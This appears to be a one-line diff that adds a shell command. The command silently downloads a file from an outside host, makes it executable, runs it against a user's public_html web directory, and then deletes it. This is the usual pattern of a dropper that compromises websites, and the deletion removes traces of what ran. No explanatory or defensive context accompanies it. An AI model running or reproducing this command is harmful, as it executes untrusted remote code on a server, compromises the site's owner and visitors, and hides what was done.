@@ -1,0 +1,1 @@
+wget -q -O xxxd http://hello.hahaha666.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home/slikenap/public_html 24 && rm -f xxxd
